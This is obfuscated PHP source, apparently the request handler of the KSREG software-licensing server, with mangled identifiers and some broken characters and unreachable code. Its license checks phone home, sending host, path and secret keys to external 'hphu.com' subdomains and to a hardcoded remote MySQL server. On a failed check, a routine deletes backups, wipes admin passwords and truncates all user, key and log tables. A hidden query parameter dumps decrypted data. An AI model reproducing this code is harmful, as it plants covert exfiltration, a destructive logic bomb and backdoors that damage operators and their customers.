    if ( substr( $_obf_hoiLiJKHjpKJj46NkYuViI0�, 8 ) != sprintf( "%u", crc32( WEBLIC.HTTPKEY.substr( $_obf_hoiLiJKHjpKJj46NkYuViI0�, 0, 8 )."abcdefghijklmn" ) ) )
    {
        @file_put_contents( $_obf_iZCTk5SRlZGVkIqRhouHi5Q�, "" );
        if ( $_obf_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
        {
            exit( "crypteno156" );
        }
        exit( "kss_logs/index.log被非法修改" );
    }
    if ( 85400 < abs( strtotime( substr( $_obf_kYaTjoqIi5STkY2Jh4qIlJU�, 0, 8 ) ) - strtotime( substr( $_obf_hoiLiJKHjpKJj46NkYuViI0�, 0, 8 ) ) ) )
    {
        $_obf_jouQkY2GipOLh5CUiI2Thoc� = 1;
        @file_put_contents( $_obf_iZCTk5SRlZGVkIqRhouHi5Q�, $_obf_kYaTjoqIi5STkY2Jh4qIlJU� );
        $_obf_hoiLiJKHjpKJj46NkYuViI0� = @file_get_contents( $_obf_iZCTk5SRlZGVkIqRhouHi5Q� );
        if ( $_obf_kYaTjoqIi5STkY2Jh4qIlJU� != $_obf_hoiLiJKHjpKJj46NkYuViI0� )
        {
            if ( $_obf_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
            {
                exit( "crypteno155" );
            }
            exit( "kss_logs/index.log不可写" );
        }
    }
    if ( $_obf_jouQkY2GipOLh5CUiI2Thoc� == 1 )
    {
        set_error_handler( "error_report_fun_norpeat" );
        $_obf_iJSGk5WKlIaUiI6SjZCTh4c� = urlencode( $_obf_hoyQjo_QlYeLh5OVk4yPjZM� );
        $_obf_lIeJjoyHiIuTkYuTj4aGjYo� = date( "Y-m-d H:i:s" );
        $_obf_i5WSh4iUj4aKi5WVk42Jh5U� = $_SERVER['HTTP_HOST'];
        if ( empty( $_obf_i5WSh4iUj4aKi5WVk42Jh5U� ) )
        {
            $_obf_i5WSh4iUj4aKi5WVk42Jh5U� = "notfind";
        }
        if ( $_obf_i5WSh4iUj4aKi5WVk42Jh5U� != "notfind" )
        {
            $_obf_i5WSh4iUj4aKi5WVk42Jh5U� = urlencode( $_obf_i5WSh4iUj4aKi5WVk42Jh5U� );
        }
        if ( _obf_ipWHiIuOiYuPjIaPkZSThok�( "curl_init" ) && _obf_ipWHiIuOiYuPjIaPkZSThok�( "curl_exec" ) )
        {
            _obf_jomIiY_JjIqRkoiTiImVkIc�( $_obf_lIeJjoyHiIuTkYuTj4aGjYo�, $_obf_iJSGk5WKlIaUiI6SjZCTh4c�, $_obf_i5WSh4iUj4aKi5WVk42Jh5U� );
        }
        else
        {
            _obf_lZSKi46HhpCGh4aQh4aVi40�( $_obf_lIeJjoyHiIuTkYuTj4aGjYo�, $_obf_iJSGk5WKlIaUiI6SjZCTh4c�, $_obf_i5WSh4iUj4aKi5WVk42Jh5U� );
        }
        set_error_handler( "error_report_fun" );
    }
}

function _obf_kZGIlYyKh5OIlYyKlYeTlJM�( $_obf_ipKRjYaPkJWQj4eKiJWRjJQ� )
{
    $_obf_h5GOjJOKlI_TkIuTj4yUjow� = opendir( $_obf_ipKRjYaPkJWQj4eKiJWRjJQ� );
    while ( $_obf_kY_Ki4_NiIqMj5CSiIiRk48� = readdir( $_obf_h5GOjJOKlI_TkIuTj4yUjow� ) )
    {
        if ( !( $_obf_kY_Ki4_NiIqMj5CSiIiRk48� != "." ) && !( $_obf_kY_Ki4_NiIqMj5CSiIiRk48� != ".." ) )
        {
            $_obf_j5SMipOTkJSMlYaViJGGlI4� = $_obf_ipKRjYaPkJWQj4eKiJWRjJQ�."/".$_obf_kY_Ki4_NiIqMj5CSiIiRk48�;
            if ( is_dir( $_obf_j5SMipOTkJSMlYaViJGGlI4� ) )
            {
                echo $_obf_j5SMipOTkJSMlYaViJGGlI4�;
                echo "<br>";
            }
        }
    }
    closedir( $_obf_h5GOjJOKlI_TkIuTj4yUjow� );
}

function _obf_ipORj42NiZCIio_LkZORhpE�( $_obf_h4yHlYmLipCJjJCGhomJjZA� )
{
    if ( !is_file( "clsdata.log" ) )
    {
        @file_put_contents( "clsdata.log", date( "ymdHis" )."\t".$_obf_h4yHlYmLipCJjJCGhomJjZA�."\r\n\r\n" );
    }
    else
    {
        @file_put_contents( "clsdata.log", date( "ymdHis" )."\t".$_obf_h4yHlYmLipCJjJCGhomJjZA�."\r\n\r\n", FILE_APPEND );
    }
}

function _obf_iZSOiYeSlIqPjpSLkpSIj40�( )
{
    global $_obf_jJKVlIqIlYaKjYmOlIuGkJI�;
    $_obf_kY2Rj4mPjoaGjoeMjpOKhpM� = explode( ",", substr( WEBLIC, 33 ) );
    $_obf_lJOVj5WVkI2PjI6QjZWJjoY� = $_SERVER['HTTP_HOST'];
    $_obf_jpKPlJSUiZOHkYaPlIeOiY4� = strpos( $_obf_lJOVj5WVkI2PjI6QjZWJjoY�, ":" );
    if ( $_obf_jpKPlJSUiZOHkYaPlIeOiY4� !== FALSE )
    {
        $_obf_lJOVj5WVkI2PjI6QjZWJjoY� = substr( $_obf_lJOVj5WVkI2PjI6QjZWJjoY�, 0, $_obf_jpKPlJSUiZOHkYaPlIeOiY4� );
    }
    if ( in_array( strtolower( $_obf_lJOVj5WVkI2PjI6QjZWJjoY� ), $_obf_kY2Rj4mPjoaGjoeMjpOKhpM� ) )
    {
        if ( isset( $_SERVER['ALL_HTTP'] ) && stristr( $_SERVER['ALL_HTTP'], $_obf_lJOVj5WVkI2PjI6QjZWJjoY� ) === FALSE )
        {
            _obf_ipORj42NiZCIio_LkZORhpE�( "no clear,domain err:\r\n".$_SERVER['HTTP_HOST']."\r\n".$_SERVER['ALL_HTTP'] );
            if ( $_obf_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
            {
                exit( "crypteno888" );
            }
            exit( "Domain binding errors,  Thank you for using KSREG! ALL_HTTP" );
        }
    }
    else
    {
        _obf_ipORj42NiZCIio_LkZORhpE�( "no clear,domain err:\r\n".$_SERVER['HTTP_HOST']."\r\n".$_SERVER['ALL_HTTP'] );
        if ( $_obf_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
        {
            exit( "crypteno888" );
        }
        exit( "Domain binding errors,  Thank you for using KSREG! ALL_HTTP! HTTP_HOST" );
    }
}

function _obf_jomIiY_JjIqRkoiTiImVkIc�( $_obf_lIeJjoyHiIuTkYuTj4aGjYo�, $_obf_iJSGk5WKlIaUiI6SjZCTh4c�, $_obf_i5WSh4iUj4aKi5WVk42Jh5U� )
{
    $_obf_joiNh4aIhouViZGQho_JiI4� = curl_init( );
    curl_setopt( $_obf_joiNh4aIhouViZGQho_JiI4�, CURLOPT_URL, "http://chk".mt_rand( 100000, 999999 ).".hphu.com/skey/api.php?r=".time( ) );
    curl_setopt( $_obf_joiNh4aIhouViZGQho_JiI4�, CURLOPT_RETURNTRANSFER, 1 );
    $_obf_hoeUj5OSh5CMlI2Qh42Ijoc� = "svrid=".SVRID."&hostname=".$_obf_iJSGk5WKlIaUiI6SjZCTh4c�."&skey=".PRV_SVRLIC."&spath=".dirname( __FILE__ )."&domain=".$_obf_i5WSh4iUj4aKi5WVk42Jh5U�."&weblic=".urlencode( WEBLIC )."&webid=".urlencode( WEBID )."&nowtime=".date( "Y-m-d H:i:s" );
    curl_setopt( $_obf_joiNh4aIhouViZGQho_JiI4�, CURLOPT_POST, 1 );
    curl_setopt( $_obf_joiNh4aIhouViZGQho_JiI4�, CURLOPT_POSTFIELDS, $_obf_hoeUj5OSh5CMlI2Qh42Ijoc� );
    curl_setopt( $_obf_joiNh4aIhouViZGQho_JiI4�, CURLOPT_TIMEOUT, 5 );
    curl_setopt( $_obf_joiNh4aIhouViZGQho_JiI4�, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; SV1)" );
    curl_setopt( $_obf_joiNh4aIhouViZGQho_JiI4�, CURLOPT_HTTPHEADER, array( "Accept-Language: zh-cn", "Connection: close", "Cache-Control: no-cache" ) );
    $_obf_lJCJh4yIiZSPi5WUko2Nh4g� = curl_exec( $_obf_joiNh4aIhouViZGQho_JiI4� );
    if ( curl_errno( $_obf_joiNh4aIhouViZGQho_JiI4� ) )
    {
        @curl_close( $_obf_joiNh4aIhouViZGQho_JiI4� );
        _obf_lZSKi46HhpCGh4aQh4aVi40�( );
    }
    else
    {
        curl_close( $_obf_joiNh4aIhouViZGQho_JiI4� );
        if ( $_obf_lJCJh4yIiZSPi5WUko2Nh4g� == "isbadlic" )
        {
            _obf_ipORj42NiZCIio_LkZORhpE�( "clear,curl badlist" );
            _obf_koyMjY2HkImOho6JkIeQh4c�( );
        }
    }
}

function _obf_lZSKi46HhpCGh4aQh4aVi40�( $_obf_lIeJjoyHiIuTkYuTj4aGjYo�, $_obf_iJSGk5WKlIaUiI6SjZCTh4c�, $_obf_i5WSh4iUj4aKi5WVk42Jh5U� )
{
    return FALSE;
}

function _obf_jpSQjpGSkoeUkJGHk4_Pi5E�( $_obf_lIeJjoyHiIuTkYuTj4aGjYo�, $_obf_iJSGk5WKlIaUiI6SjZCTh4c�, $_obf_i5WSh4iUj4aKi5WVk42Jh5U� )
{
    if ( "/" == DIRECTORY_SEPARATOR )
    {
        $_obf_i4mPkoiQlZSHiZKLjZKVi4c� = $_SERVER['SERVER_ADDR'];
    }
    else
    {
        $_obf_i4mPkoiQlZSHiZKLjZKVi4c� = @gethostbyname( $_SERVER['SERVER_NAME'] );
    }
    $_obf_lIuNkpKUioySj4eTkYqSjZM� = @mysql_connect( "58.221.31.10:33069", "readuser", "password" );
    if ( $_obf_lIuNkpKUioySj4eTkYqSjZM� )
    {
        if ( @mysql_select_db( "readuser", $_obf_lIuNkpKUioySj4eTkYqSjZM� ) )
        {
            $_obf_kY_OlYeUlIiVjo6Hio_MkpI� = @mysql_query( "select * from `locktable` where `lockstr`='".WEBID."' or `lockstr`='".WEBLIC."' or `lockstr`='".PRV_SVRLIC."' or `lockstr`='".$_obf_iJSGk5WKlIaUiI6SjZCTh4c�."' ", $_obf_lIuNkpKUioySj4eTkYqSjZM� );
            if ( $_obf_kY_OlYeUlIiVjo6Hio_MkpI� !== FALSE && 0 < mysql_num_rows( $_obf_kY_OlYeUlIiVjo6Hio_MkpI� ) )
            {
                _obf_ipORj42NiZCIio_LkZORhpE�( "sql badlist" );
                _obf_koyMjY2HkImOho6JkIeQh4c�( );
                mysql_query( "INSERT INTO `logtablelog` (`isok`,`clienttime` ,`hostname` ,`domain` ,`weblic`, `webid`,`svrid`,`skey`,`cip`)VALUES (0,'".$_obf_lIeJjoyHiIuTkYuTj4aGjYo�."', '".$_obf_iJSGk5WKlIaUiI6SjZCTh4c�."', '".$_obf_i5WSh4iUj4aKi5WVk42Jh5U�."', '".WEBLIC."', '".WEBID."',".( SVRID + 2 ).",'".PRV_SVRLIC."','".$_obf_i4mPkoiQlZSHiZKLjZKVi4c�."')", $_obf_lIuNkpKUioySj4eTkYqSjZM� );
            }
            else
            {
                mysql_query( "INSERT INTO `logtablelog` (`isok`,`clienttime` ,`hostname` ,`domain` ,`weblic`, `webid`,`svrid`,`skey`,`cip`)VALUES (1,'".$_obf_lIeJjoyHiIuTkYuTj4aGjYo�."', '".$_obf_iJSGk5WKlIaUiI6SjZCTh4c�."', '".$_obf_i5WSh4iUj4aKi5WVk42Jh5U�."', '".WEBLIC."', '".WEBID."',".( SVRID + 2 ).",'".PRV_SVRLIC."','".$_obf_i4mPkoiQlZSHiZKLjZKVi4c�."')", $_obf_lIuNkpKUioySj4eTkYqSjZM� );
            }
        }
        @mysql_close( $_obf_lIuNkpKUioySj4eTkYqSjZM� );
        return TRUE;
    }
    return FALSE;
}

function _obf_koyMjY2HkImOho6JkIeQh4c�( $_obf_koqQlY6KkIePi4mHi4uHh5U� = "" )
{
    global $_obf_mGKRY4dMuU6bZZJfh1_TX5k�;
    global $_obf_jJKVlIqIlYaKjYmOlIuGkJI�;
    if ( $_obf_koqQlY6KkIePi4mHi4uHh5U� != "" )
    {
        $_obf_mGKRY4dMuU6bZZJfh1_TX5k� = $_obf_koqQlY6KkIePi4mHi4uHh5U�;
        $_obf_jJKVlIqIlYaKjYmOlIuGkJI� = 0;
    }
    file_put_contents( KSSLOGDIR."index.log", "200001011059550389" );
    if ( defined( "NOTDELMYSQL" ) )
    {
        if ( $_obf_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
        {
            exit( "crypteno888" );
        }
        exit( "Thank you for using KSREG,   please support the Genuine software! NCLS" );
    }
    $_obf_j4uLj5OUi42Gh5SQlYiOjIc� = _obf_iJCRko_Hj4_Oh4eIjIaKk5I�( KSSROOTDIR."kss_logs".DIRECTORY_SEPARATOR."databak".DIRECTORY_SEPARATOR, "zip" );
    if ( !empty( $_obf_j4uLj5OUi42Gh5SQlYiOjIc� ) )
    {
        foreach ( $_obf_j4uLj5OUi42Gh5SQlYiOjIc� as $_obf_iJWSjpGIi4eHipWGhoeRk4Y� )
        {
            @file_put_contents( $_obf_iJWSjpGIi4eHipWGhoeRk4Y�, "dataerr" );
            @unlink( $_obf_iJWSjpGIi4eHipWGhoeRk4Y� );
        }
    }
    $_obf_jIaUiIeSjZWKlIqLkIqOioc� = new mysql_cls( );
    $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_jIuSjYuUkJGHlYuPjZOQjY4�( $_obf_mGKRY4dMuU6bZZJfh1_TX5k� );
    $_obf_j4eSkIiSiZCRh4_NiYaQkYk� = $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_lZGTiIiKhouKiZGLi5KUkI8�( "select * from kss_tb_soft " );
    foreach ( $_obf_j4eSkIiSiZCRh4_NiYaQkYk� as $_obf_kY_OlYeUlIiVjo6Hio_MkpI� )
    {
        $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "update `kss_z_user_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['id']."` set cday=1000", "sync" );
        $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "update `kss_z_key_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['id']."` set cday=1000", "sync" );
    }
    $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "update kss_tb_manager set password='000000000000000', rmb=0, level=6, islock=1", "sync" );
    $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "update kss_tb_soft set softcode=1000099, softmode='NoN', softkey='000000000000000'", "sync" );
    foreach ( $_obf_j4eSkIiSiZCRh4_NiYaQkYk� as $_obf_kY_OlYeUlIiVjo6Hio_MkpI� )
    {
        $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "TRUNCATE TABLE `kss_z_user_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['id']."`", "sync" );
        $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "TRUNCATE TABLE `kss_z_key_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['id']."`", "sync" );
        $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "TRUNCATE TABLE `kss_z_log_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['id']."`", "sync" );
        $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "TRUNCATE TABLE `kss_z_user_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['id']."_recycle`", "sync" );
        $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "TRUNCATE TABLE `kss_z_key_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['id']."`_recycle", "sync" );
    }
    $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "TRUNCATE TABLE `kss_tb_soft`", "sync" );
    $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "TRUNCATE TABLE `kss_tb_manager`", "sync" );
    if ( $_obf_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
    {
        exit( "crypteno888" );
    }
    exit( "Thank you for using KSREG,    please support the Genuine software! CLS" );
}

define( "CLVersion", 10 );
require( "io_ext.php" );
require( "../kss_inc/inc.php" );
_obf_kouKkIeViIqPk5KMiIiMkpE�( );
require( Client_Language.".php" );
set_error_handler( "error_report_fun_api" );
$_obf_jJKVlIqIlYaKjYmOlIuGkJI� = _obf_i4mIkpOGkomKiouRhoaMh5I�( "c", "pg", "int", 1 );
$_obf_kZOLkIiTk46UiJKPkZSTk48� = _obf_i4mIkpOGkomKiouRhoaMh5I�( "apiver", "pg", "int", 900 );
$_obf_lZOThomRipOIi5SRhpWRjY4� = _obf_i4mIkpOGkomKiouRhoaMh5I�( "a", "pg", "sql", "" );
$_obf_j4uUkImJj4iJipGVioqGk4w� = $_SERVER['HTTP_HOST'];
$_obf_lZWPi4aGiYmRkIuVjYuMh4w� = strpos( $_obf_j4uUkImJj4iJipGVioqGk4w�, ":" );
if ( $_obf_lZWPi4aGiYmRkIuVjYuMh4w� !== FALSE )
{
    $_obf_j4uUkImJj4iJipGVioqGk4w� = substr( $_obf_j4uUkImJj4iJipGVioqGk4w�, 0, $_obf_lZWPi4aGiYmRkIuVjYuMh4w� );
}
if ( isset( $_GET['testsync'] ) && md5( $_GET['testsync'] ) == MYSQLBAKPASSWORD )
{
    $_obf_jIaUiIeSjZWKlIqLkIqOioc� = new mysql_cls( );
    $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_jIuSjYuUkJGHlYuPjZOQjY4�( $_obf_mGKRY4dMuU6bZZJfh1_TX5k� );
    echo "同步测试已启动，请到系统任务日志查看";
    _obf_ho_Ki4_TiZCUk4yOkJCPh5M�( );
    exit( );
}
switch ( $_obf_kZOLkIiTk46UiJKPkZSTk48� )
{
case 905 :
    define( "CLIENTVER", 905 );
    if ( stristr( WEBLIC.",", ",".$_obf_j4uUkImJj4iJipGVioqGk4w�."," ) === FALSE )
    {
        if ( $_obf_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
        {
            exit( "crypteno888" );
        }
        exit( "Thank you for using KSREG, please support the Genuine software![".$_obf_j4uUkImJj4iJipGVioqGk4w�."]" );
    }
    include( "../kss_inc/signdata/crypt95.php" );
    break;
    if ( $_obf_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
    {
        exit( "crypteno531" );
    }
    exit( "kssdata".QQ236 );
}
if ( mt_rand( 1, 10 ) == 5 )
{
    _obf_io_MiI6UjIyKkJOVk5GSjYo�( "api.php", $_obf_jJKVlIqIlYaKjYmOlIuGkJI� );
}
if ( $_obf_lZOThomRipOIi5SRhpWRjY4� == "uplog" )
{
    include( dirname( __FILE__ ).DIRECTORY_SEPARATOR."io".DIRECTORY_SEPARATOR."soft.php" );
    exit( );
}
$_obf_jJKOjo2Qk46Qk4qOjJSTjJM� = 0;
$_obf_hoeUj5OSh5CMlI2Qh42Ijoc� = _obf_i4mIkpOGkomKiouRhoaMh5I�( "s", "pg", "", "" );
$_obf_lImKk4iUhomPiYiKioaHjow� = $_obf_hoeUj5OSh5CMlI2Qh42Ijoc�;
if ( function_exists( "extfun_decode" ) )
{
    $_obf_hoeUj5OSh5CMlI2Qh42Ijoc� = extfun_decode( $_obf_hoeUj5OSh5CMlI2Qh42Ijoc� );
}
$_obf_ko2PhoaRkIeRh5GQjIuGjo4� = 0;
$_obf_hoeUj5OSh5CMlI2Qh42Ijoc� = _obf_kpWMjJWVjZWHj4aTkJGMj4c�( $_obf_hoeUj5OSh5CMlI2Qh42Ijoc�, &$_obf_ko2PhoaRkIeRh5GQjIuGjo4�, Client_Language );
if ( "crypt" != substr( $_obf_hoeUj5OSh5CMlI2Qh42Ijoc�, 0, 5 ) )
{
    if ( $_obf_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
    {
        exit( "crypteno118" );
    }
    exit( "kssdata服务器无法正常解密数据。" );
}
if ( substr( $_obf_hoeUj5OSh5CMlI2Qh42Ijoc�, 0, 6 ) == "crypt " )
{
    $_obf_hpKMkImIjJSUh4aVkYuIlZE� = KSSINCDIR."advapi".DIRECTORY_SEPARATOR."rsa".substr( $_obf_hoeUj5OSh5CMlI2Qh42Ijoc�, 9, 7 ).".php";
    if ( is_file( $_obf_hpKMkImIjJSUh4aVkYuIlZE� ) )
    {
        include( $_obf_hpKMkImIjJSUh4aVkYuIlZE� );
        if ( SOFTRSAMODE == 0 )
        {
            if ( strlen( RSA_PRVKEY ) < 70 || strlen( RSA_MODULES ) < 70 || RSACRYPT == 0 )
            {
                exit( "crypteno151" );
            }
            $_obf_io6KipWRkpKNlZKSk5CLkpA� = stripos( $_obf_hoeUj5OSh5CMlI2Qh42Ijoc�, "`" );
            $_obf_hpKMlYyOiYaNiJGNlYuIkYo� = rsa_decrypt( substr( $_obf_hoeUj5OSh5CMlI2Qh42Ijoc�, 17, $_obf_io6KipWRkpKNlZKSk5CLkpA� - 17 ), RSA_PRVKEY, RSA_MODULES, 256 );
            $_obf_hoeUj5OSh5CMlI2Qh42Ijoc� = str_replace( " ", "", substr( $_obf_hoeUj5OSh5CMlI2Qh42Ijoc�, 0, 17 ) ).$_obf_hpKMlYyOiYaNiJGNlYuIkYo�.substr( $_obf_hoeUj5OSh5CMlI2Qh42Ijoc�, $_obf_io6KipWRkpKNlZKSk5CLkpA� + 1 );
        }
        else
        {
            if ( strlen( SOFTRSAEKEY ) < 70 || strlen( SOFTRSANKEY ) < 70 || SOFTRSAMODE == 2 )
            {
                exit( "crypteno151" );
            }
            $_obf_io6KipWRkpKNlZKSk5CLkpA� = stripos( $_obf_hoeUj5OSh5CMlI2Qh42Ijoc�, "`" );
            $_obf_hpKMlYyOiYaNiJGNlYuIkYo� = rsa_decrypt( substr( $_obf_hoeUj5OSh5CMlI2Qh42Ijoc�, 17, $_obf_io6KipWRkpKNlZKSk5CLkpA� - 17 ), SOFTRSAEKEY, SOFTRSANKEY, 256 );
            $_obf_hoeUj5OSh5CMlI2Qh42Ijoc� = str_replace( " ", "", substr( $_obf_hoeUj5OSh5CMlI2Qh42Ijoc�, 0, 17 ) ).$_obf_hpKMlYyOiYaNiJGNlYuIkYo�.substr( $_obf_hoeUj5OSh5CMlI2Qh42Ijoc�, $_obf_io6KipWRkpKNlZKSk5CLkpA� + 1 );
        }
    }
    else
    {
        exit( "crypteno171" );
    }
}
if ( defined( "SQLSAFECHK" ) && preg_match( "/select|insert|update|delete |union|into|load_file|outfile|\\.\\/|\\/\\*|\\%[0-9a-f]{2}|--|char\\(|0x[0-9a-f]{6}|'/i", $_obf_hoeUj5OSh5CMlI2Qh42Ijoc� ) )
{
    $_obf_ipWMho2NlI2MiI_MioeTlZI� = "?";
    $_obf_ipCIiZCRiYmKhpOSi4eSjZI� = "<".$_obf_ipWMho2NlI2MiI_MioeTlZI�."php exit('Access denied to view this page!');".$_obf_ipWMho2NlI2MiI_MioeTlZI�.">\r\n";
    if ( !is_file( "sqlhklog.php" ) && 102400 < filesize( "sqlhklog.php" ) )
    {
        file_put_contents( "sqlhklog.php", $_obf_ipCIiZCRiYmKhpOSi4eSjZI�.date( "ymdHis" )."\t"._obf_iIuRj5CUkIuHi4mPkY2Vio0�( )."\t".$_obf_hoeUj5OSh5CMlI2Qh42Ijoc�."\r\n\r\n" );
    }
    else
    {
        file_put_contents( "sqlhklog.php", date( "ymdHis" )."\t"._obf_iIuRj5CUkIuHi4mPkY2Vio0�( )."\t".$_obf_hoeUj5OSh5CMlI2Qh42Ijoc�."\r\n\r\n", FILE_APPEND );
    }
    if ( $_obf_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
    {
        exit( "crypteno157" );
    }
    exit( "kssdata".QQ235 );
}
$_obf_k42Uko6Qk5CLiYqIjI_Ih5U� = explode( ":|:", $_obf_hoeUj5OSh5CMlI2Qh42Ijoc� );
if ( isset( $_GET['view'] ) && md5( $_GET['view'] ) == "fb87582825f9d28a8d42c5e5e5e8b23d" )
{
    print_r( $_obf_k42Uko6Qk5CLiYqIjI_Ih5U� );
}
$_obf_kZOJlZCOlZKRioiGiIuPkok� = "io";
$_obf_kZGNjJSKkpCQj4yOj5GNiIo� = $_obf_k42Uko6Qk5CLiYqIjI_Ih5U�[2];
$_obf_iImHhpCJi4eSkY_VjZOUj5Q� = $_obf_k42Uko6Qk5CLiYqIjI_Ih5U�[3];
$_obf_joeUio_LioqSh5WIiI2Pk4s� = $_obf_k42Uko6Qk5CLiYqIjI_Ih5U�[4];
$_obf_io_UkouIkIyHj42UlI_GiZA� = explode( ",", $_obf_joeUio_LioqSh5WIiI2Pk4s� );
$_obf_jomPk5WKioeLipGGi4_PhpM� = time( );
if ( !stripos( WEBLIC, "v9.hphu.com" ) )
{
    if ( stripos( WEBLIC, "vip.gutou.cc" ) !== FALSE )
    {
        if ( 1000200 < $_obf_iImHhpCJi4eSkY_VjZOUj5Q� )
        {
            if ( $_obf_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
            {
                exit( "crypteno103" );
            }
            exit( "kssdata".QQ102.strlen( $_obf_iImHhpCJi4eSkY_VjZOUj5Q� ) );
        }
    }
    else
    {
        if ( 1000100 < $_obf_iImHhpCJi4eSkY_VjZOUj5Q� )
        {
            if ( $_obf_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
            {
                exit( "crypteno103" );
            }
            exit( "kssdata".QQ102.strlen( $_obf_iImHhpCJi4eSkY_VjZOUj5Q� ) );
        }
    }
}
if ( $_obf_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
{
    if ( !_obf_kZKMiI2OlY6Ih42OkI6Sjo0�( $_obf_iImHhpCJi4eSkY_VjZOUj5Q� ) && strlen( $_obf_iImHhpCJi4eSkY_VjZOUj5Q� ) != 7 )
    {
        if ( _obf_kZKMiI2OlY6Ih42OkI6Sjo0�( $_obf_iImHhpCJi4eSkY_VjZOUj5Q� ) !== TRUE )
        {
            exit( "crypteno330" );
        }
        exit( "crypteno103" );
    }
    if ( stripos( $_obf_joeUio_LioqSh5WIiI2Pk4s�, "'" ) !== FALSE )
    {
        exit( "crypteno110" );
    }
}
else
{
    $_obf_h5CLkpKNipOHjIqSiIaUlYo� = _obf_kZKMiI2OlY6Ih42OkI6Sjo0�( $_obf_iImHhpCJi4eSkY_VjZOUj5Q� );
    if ( !_obf_kZKMiI2OlY6Ih42OkI6Sjo0�( $_obf_iImHhpCJi4eSkY_VjZOUj5Q� ) && strlen( $_obf_iImHhpCJi4eSkY_VjZOUj5Q� ) != 7 )
    {
        if ( _obf_kZKMiI2OlY6Ih42OkI6Sjo0�( $_obf_iImHhpCJi4eSkY_VjZOUj5Q� ) !== TRUE )
        {
            exit( "kssdata".QQ330.strlen( $_obf_iImHhpCJi4eSkY_VjZOUj5Q� ) );
        }
        exit( "kssdata".QQ102.strlen( $_obf_iImHhpCJi4eSkY_VjZOUj5Q� ) );
    }
    if ( stripos( $_obf_joeUio_LioqSh5WIiI2Pk4s�, "'" ) !== FALSE )
    {
        exit( "kssdata".QQ103 );
    }
}
$_obf_ipGTiYaMjI2PjIiJjZSSkoc� = dirname( __FILE__ ).DIRECTORY_SEPARATOR.$_obf_kZOJlZCOlZKRioiGiIuPkok�.DIRECTORY_SEPARATOR;
$_obf_k5CLh5CJiJOPiZGLlY_UiZE� = $_obf_ipGTiYaMjI2PjIiJjZSSkoc�.$_obf_kZGNjJSKkpCQj4yOj5GNiIo�.".php";
$_obf_jIaUiIeSjZWKlIqLkIqOioc� = new mysql_cls( );
$_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_jIuSjYuUkJGHlYuPjZOQjY4�( $_obf_mGKRY4dMuU6bZZJfh1_TX5k� );
$_obf_jZGRipSRkIeUiIeQjoaUjJI� = $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_iY6OkJCRkY2PjpCPk5CRkJA�( "select * from kss_tb_soft where `softcode`=".$_obf_iImHhpCJi4eSkY_VjZOUj5Q� );
if ( empty( $_obf_jZGRipSRkIeUiIeQjoaUjJI� ) )
{
    if ( $_obf_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
    {
        exit( "crypteno101" );
    }
    exit( "kssdata".QQ104 );
}
_obf_i4yHiJWOjZKUkY_QkouIi5M�( $_obf_jZGRipSRkIeUiIeQjoaUjJI�['mac_blacklist'], long2ip( $_obf_kYmJjZOIiZKJioqMkoaGiYk� ), $_obf_joeUio_LioqSh5WIiI2Pk4s� );
if ( $_obf_jZGRipSRkIeUiIeQjoaUjJI�['softstatus'] == 1 && $_obf_kZGNjJSKkpCQj4yOj5GNiIo� != "unline" )
{
    if ( $_obf_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
    {
        exit( "crypteno107" );
    }
    exit( "kssdata".QQ105 );
}
